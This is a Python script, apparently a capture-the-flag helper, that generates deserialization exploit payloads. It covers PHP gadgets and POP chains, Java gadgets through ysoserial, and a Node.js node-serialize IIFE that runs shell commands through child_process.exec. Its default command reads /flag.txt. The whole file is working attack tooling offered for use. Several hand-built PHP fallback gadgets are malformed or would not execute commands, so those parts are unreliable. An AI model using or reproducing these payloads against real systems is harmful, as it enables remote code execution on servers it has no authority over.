#!/usr/bin/env python3
"""Deserialization Payload Generator — 通用反序列化 payload 生成

支持的格式:
  - PHP: 常见 gadget 类序列化 (需要 phpggc 或手动构造)
  - Java: 调用外部 ysoserial 或提供 base64 encoded payload
  - .NET: ViewState 等常见格式
  - Node.js: node-serialize IIFE payload

用法:
  python deser_gen.py --format php --gadget RCE --cmd "cat /flag.txt"
  python deser_gen.py --format java --gadget CommonsCollections1 --cmd "cat /flag.txt"
  python deser_gen.py --format node --cmd "cat /flag.txt"

输出: JSON {format, gadget, payload_base64, payload_raw, notes}
"""

import argparse, base64, json, shutil, subprocess, sys, tempfile


def gen_php_gadget(gadget: str, cmd: str) -> dict:
    """生成 PHP 序列化 gadget"""
    # 尝试使用 phpggc
    phpggc = shutil.which("phpggc") or shutil.which("phpggc.phar")
    if phpggc:
        try:
            result = subprocess.run(
                [phpggc, gadget, "system", cmd],
                capture_output=True, text=True, timeout=10
            )
            if result.returncode == 0:
                return {
                    "format": "php",
                    "gadget": gadget,
                    "cmd": cmd,
                    "payload_raw": result.stdout.strip(),
                    "payload_base64": base64.b64encode(result.stdout.encode()).decode(),
                    "tool": "phpggc",
                    "notes": "Send as serialized PHP object. Content-Type: application/x-php-serialized"
                }
        except Exception:
            pass

    # Fallback: 手动常见 gadget
    fallbacks = {
        "RCE": f'O:9:"Exception":3:{{s:7:"message";s:{len(cmd)}:"{cmd}";s:4:"code";i:0;s:4:"file";s:0:"";}}',
        "Monolog/RCE1": f'O:32:"Monolog\\Handler\\SyslogUdpHandler":1:{{s:9:"*socket";s:{len(cmd)}:"{cmd}";}}',
        "Guzzle/FW1": f'O:23:"GuzzleHttp\\Cookie\\FileCookieJar":4:{{s:7:"*filename";s:{len(cmd)}:"{cmd}";s:7:"*data";N;s:7:"*path";N;s:7:"*scheme";N;}}',
    }

    payload = fallbacks.get(gadget, fallbacks["RCE"])
    return {
        "format": "php",
        "gadget": gadget,
        "cmd": cmd,
        "payload_raw": payload,
        "payload_base64": base64.b64encode(payload.encode()).decode(),
        "tool": "manual",
        "notes": "phpggc not found, using manual gadget. Install phpggc for full gadget support."
    }


def gen_java_gadget(gadget: str, cmd: str) -> dict:
    """生成 Java 反序列化 gadget (via ysoserial)"""
    ysoserial = shutil.which("ysoserial") or shutil.which("ysoserial.jar")
    if not ysoserial:
        return {
            "format": "java",
            "gadget": gadget,
            "error": "ysoserial not found in PATH",
            "notes": "Install ysoserial: wget https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar"
        }

    try:
        result = subprocess.run(
            ["java", "-jar", ysoserial, gadget, cmd],
            capture_output=True, timeout=30
        )
        payload = result.stdout
        return {
            "format": "java",
            "gadget": gadget,
            "cmd": cmd,
            "payload_raw": base64.b64encode(payload).decode(),
            "payload_base64": base64.b64encode(payload).decode(),
            "size_bytes": len(payload),
            "tool": "ysoserial",
            "notes": "Send as raw binary (Java serialized object) or base64 encoded. Content-Type: application/x-java-serialized-object"
        }
    except subprocess.TimeoutExpired:
        return {"format": "java", "gadget": gadget, "error": "ysoserial timeout"}


def gen_nodejs_gadget(cmd: str) -> dict:
    """生成 Node.js 反序列化 payload (node-serialize IIFE)"""
    # IIFE (Immediately Invoked Function Expression) for node-serialize
    payload = (
        f"_$$ND_FUNC$$_function(){{"
        f"require('child_process').exec('{cmd}', function(err, stdout, stderr){{"
        f"if(stdout){{console.log(stdout);}}"
        f"}});"
        f"}}()"
    )
    return {
        "format": "nodejs",
        "gadget": "IIFE",
        "cmd": cmd,
        "payload_raw": payload,
        "payload_base64": base64.b64encode(payload.encode()).decode(),
        "notes": "Send as the unserialize() input. Works with node-serialize package."
    }


def gen_php_pop_chain(class_name: str, props: dict[str, str], method_chain: list[str]) -> dict:
    """手动构造 PHP POP 链序列化"""
    # 构造一个简单的序列化对象链
    serialized = f'O:{len(class_name)}:"{class_name}":{len(props)}:{{'
    for i, (key, val) in enumerate(props.items()):
        serialized += f's:{len(key)}:"{key}";s:{len(val)}:"{val}";'
    serialized += "}"
    return {
        "format": "php",
        "gadget": f"custom:{class_name}",
        "payload_raw": serialized,
        "payload_base64": base64.b64encode(serialized.encode()).decode(),
        "notes": f"Custom POP chain for {class_name}. Magic methods: {', '.join(method_chain)}"
    }


def main():
    parser = argparse.ArgumentParser(description="Deserialization Payload Generator")
    parser.add_argument("--format", required=True,
                        choices=["php", "java", "node", "nodejs", "custom-php"],
                        help="Target serialization format")
    parser.add_argument("--gadget", default="RCE",
                        help="Gadget name (php: RCE/Monolog-RCE1/Guzzle-FW1; java: CommonsCollections1~7/CommonsBeanutils1/Jdk7u21)")
    parser.add_argument("--cmd", default="cat /flag.txt", help="Command to execute")
    parser.add_argument("--class-name", default="Exploit", help="PHP class name for custom gadget")
    args = parser.parse_args()

    if args.format == "php":
        result = gen_php_gadget(args.gadget, args.cmd)
    elif args.format in ("java",):
        result = gen_java_gadget(args.gadget, args.cmd)
    elif args.format in ("node", "nodejs"):
        result = gen_nodejs_gadget(args.cmd)
    elif args.format == "custom-php":
        result = gen_php_pop_chain(args.class_name, {"cmd": args.cmd}, ["__destruct", "__wakeup"])

    print(json.dumps(result, indent=2, ensure_ascii=False))


if __name__ == "__main__":
    main()
